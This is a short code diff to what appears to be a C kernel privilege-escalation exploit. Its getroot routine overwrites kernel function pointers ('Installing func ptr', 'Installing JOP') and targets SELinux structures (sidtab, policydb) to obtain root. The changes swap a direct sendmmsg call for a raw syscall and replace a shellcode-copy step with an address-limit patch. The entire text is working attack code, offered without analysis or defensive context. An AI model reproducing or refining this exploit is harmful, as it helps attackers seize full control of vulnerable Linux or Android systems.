@@ -5,6 +5,8 @@
 
 #include <netinet/ip.h>
 
+#include <sys/syscall.h>
+
 #include <sys/mman.h>
 #include <sys/uio.h>
 
@@ -113,7 +115,8 @@ static void* writemsg(void* param)
 
 	while(!stop_send)
 	{
-		sendmmsg(sockfd, &msg, 1, 0);
+		//sendmmsg(sockfd, &msg, 1, 0);
+		syscall(__NR_sendmmsg, sockfd, &msg, 1, 0);
 	}
 
 	close(sockfd);
@@ -300,12 +303,11 @@ int getroot(struct offsets* o)
 	struct thread_info* ti;
 
 	printf("[+] Installing func ptr\n");
-	if(write_at_address(o->fsync, (long)MMAP_START))
+	if(write_at_address(o->fsync, (unsigned long)&patchaddrlimit))
 		return 1;
 
 	sidtab = o->sidtab;
 	policydb = o->policydb;
-	copyshellcode(MMAP_START);
 	if((dev = open("/dev/ptmx", O_RDWR)) < 0)
 		return 1;
 	
@@ -336,7 +338,7 @@ int getroot(struct offsets* o)
 	struct thread_info* ti;
 
 	printf("[+] Installing JOP\n");
-	if(write_at_address(o->check_flags, (long)o->joploc))
+	if(write_at_address(o->check_flags, (unsigned long)o->joploc))
 		return 1;
 
 	sidtab = o->sidtab;
